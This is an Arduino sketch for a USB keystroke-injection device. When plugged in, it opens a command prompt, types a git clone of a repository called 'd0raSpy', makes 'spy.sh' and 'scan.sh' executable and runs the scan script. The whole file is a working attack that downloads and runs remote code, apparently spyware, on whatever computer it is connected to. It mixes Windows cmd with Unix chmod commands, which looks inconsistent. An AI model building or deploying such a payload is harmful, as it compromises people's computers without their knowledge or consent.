#include <Keyboard.h>
void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  //Start blink led on start
  digitalWrite(LED_BUILTIN, HIGH);   
  Keyboard.begin();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(10);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("git clone https://github.com/nouseramefounded/d0raSpy.git");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cd d0raSpy/ && chmod +x spy.sh && chmod +x scan.sh && ./scan.sh ");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.end(); 
  //Stop blink led on stop                    
  digitalWrite(LED_BUILTIN, LOW);    
}
void loop() {}
